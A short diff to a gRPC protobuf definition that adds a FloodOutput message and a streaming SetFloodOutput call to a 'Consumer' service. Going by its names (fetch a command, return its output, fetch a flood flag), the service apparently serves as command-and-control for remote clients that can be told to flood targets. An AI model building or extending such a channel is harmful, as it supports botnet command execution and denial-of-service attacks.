@@ -23,6 +23,7 @@ message ClientExecOutput {
 message Void {}
 
 message FloodData { bool ShouldFlood = 1;}
+message FloodOutput { string output = 1; }
 
 message ClientDataRequest { string client_id = 1; }
 
@@ -34,4 +35,5 @@ service Consumer {
     rpc GetCommand(ClientDataRequest) returns (ClientExecData);
     rpc SetCommandOutput(ClientExecOutput) returns (Void);
     rpc GetFlood(ClientDataRequest) returns (FloodData);
+    rpc SetFloodOutput(stream FloodOutput) returns (Void);
 }
